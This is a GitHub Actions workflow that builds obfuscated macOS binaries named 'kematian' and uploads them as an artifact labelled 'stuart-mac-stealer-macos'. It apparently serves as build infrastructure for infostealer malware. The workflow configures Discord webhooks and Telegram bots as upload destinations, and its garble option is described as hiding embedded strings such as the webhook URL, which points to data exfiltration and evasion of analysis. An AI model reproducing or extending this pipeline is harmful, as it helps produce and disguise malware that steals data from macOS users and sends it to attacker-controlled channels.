name: macOS Build (CGO)

on:
  workflow_dispatch:
    inputs:
      discord_webhook:
        description: "Discord webhook URL (optional if Telegram is set)"
        type: string
        default: ""
      telegram_bot_token:
        description: "Telegram bot token from @BotFather (overrides TELEGRAM_BOT_TOKEN secret)"
        type: string
        default: ""
      telegram_chat_id:
        description: "Telegram chat/channel ID (overrides TELEGRAM_CHAT_ID secret)"
        type: string
        default: ""
      obfuscate:
        description: "Obfuscate with garble"
        type: boolean
        default: true
      garble_literals:
        description: "Garble -literals (obfuscate embedded strings like webhook URL)"
        type: boolean
        default: true
      garble_tiny:
        description: "Garble -tiny (smaller binary, slower build)"
        type: boolean
        default: false
  push:
    branches: [main]
    tags: ["v*"]

permissions:
  contents: read

jobs:
  build:
    runs-on: macos-latest
    env:
      OBFUSCATE: ${{ github.event_name == 'workflow_dispatch' && inputs.obfuscate == false && 'false' || 'true' }}

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup Go
        uses: actions/setup-go@v5
        with:
          go-version: "1.26.x"
          cache: true
          cache-dependency-path: go.sum

      - name: Verify Xcode / CGO toolchain
        run: |
          xcode-select -p
          clang --version

      - name: Install garble
        if: env.OBFUSCATE == 'true'
        run: |
          go version
          go install mvdan.cc/garble@latest
          garble version

      - name: Resolve upload credentials
        id: upload
        env:
          INPUT_WEBHOOK: ${{ github.event_name == 'workflow_dispatch' && inputs.discord_webhook || '' }}
          SECRET_WEBHOOK: ${{ secrets.DISCORD_WEBHOOK }}
          INPUT_TG_TOKEN: ${{ github.event_name == 'workflow_dispatch' && inputs.telegram_bot_token || '' }}
          SECRET_TG_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          INPUT_TG_CHAT: ${{ github.event_name == 'workflow_dispatch' && inputs.telegram_chat_id || '' }}
          SECRET_TG_CHAT: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          set -euo pipefail
          WEBHOOK="${INPUT_WEBHOOK:-}"
          if [ -z "${WEBHOOK}" ]; then
            WEBHOOK="${SECRET_WEBHOOK:-}"
          fi

          TG_TOKEN="${INPUT_TG_TOKEN:-}"
          if [ -z "${TG_TOKEN}" ]; then
            TG_TOKEN="${SECRET_TG_TOKEN:-}"
          fi

          TG_CHAT="${INPUT_TG_CHAT:-}"
          if [ -z "${TG_CHAT}" ]; then
            TG_CHAT="${SECRET_TG_CHAT:-}"
          fi

          if [ -z "${WEBHOOK}" ] && { [ -z "${TG_TOKEN}" ] || [ -z "${TG_CHAT}" ]; }; then
            echo "::error::Upload destination required. Set Discord webhook and/or Telegram bot token + chat id (workflow inputs or repo secrets)."
            exit 1
          fi

          if [ -n "${WEBHOOK}" ]; then
            echo "::add-mask::${WEBHOOK}"
            echo "DISCORD_WEBHOOK=${WEBHOOK}" >> "${GITHUB_ENV}"
            echo "discord_set=true" >> "${GITHUB_OUTPUT}"
          fi

          if [ -n "${TG_TOKEN}" ] && [ -n "${TG_CHAT}" ]; then
            echo "::add-mask::${TG_TOKEN}"
            echo "TELEGRAM_BOT_TOKEN=${TG_TOKEN}" >> "${GITHUB_ENV}"
            echo "TELEGRAM_CHAT_ID=${TG_CHAT}" >> "${GITHUB_ENV}"
            echo "telegram_set=true" >> "${GITHUB_OUTPUT}"
          elif [ -n "${TG_TOKEN}" ] || [ -n "${TG_CHAT}" ]; then
            echo "::error::Telegram requires both bot token and chat id."
            exit 1
          fi

      - name: Resolve garble flags
        if: env.OBFUSCATE == 'true'
        env:
          USE_LITERALS: ${{ github.event_name != 'workflow_dispatch' || inputs.garble_literals }}
          USE_TINY: ${{ github.event_name == 'workflow_dispatch' && inputs.garble_tiny }}
        run: |
          set -euo pipefail
          FLAGS=""
          if [[ "${USE_LITERALS}" == "true" ]]; then
            FLAGS="${FLAGS} -literals"
          fi
          if [[ "${USE_TINY}" == "true" ]]; then
            FLAGS="${FLAGS} -tiny"
          fi
          echo "GARBLE_FLAGS=${FLAGS}" >> "${GITHUB_ENV}"
          echo "Garble flags:${FLAGS:- <none>}"

      - name: Build macOS binaries (CGO)
        env:
          CGO_ENABLED: "1"
        run: |
          set -euo pipefail
          chmod +x scripts/build-macos.sh
          ./scripts/build-macos.sh

          for bin in dist/kematian-darwin-arm64 dist/kematian-darwin-amd64; do
            echo "Verifying ${bin}"
            file "${bin}"
            if [[ "${OBFUSCATE}" == "true" ]]; then
              echo "${bin}: garble build OK (CGO_ENABLED=${CGO_ENABLED})"
            elif ! go version -m "${bin}" 2>/dev/null | grep -q 'build[[:space:]]CGO_ENABLED=1'; then
              echo "::error::${bin} was not built with CGO_ENABLED=1" >&2
              exit 1
            fi
          done

          chmod +x dist/kematian-darwin-arm64 dist/kematian-darwin-amd64

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: stuart-mac-stealer-macos
          path: |
            dist/kematian-darwin-arm64
            dist/kematian-darwin-amd64
          if-no-files-found: error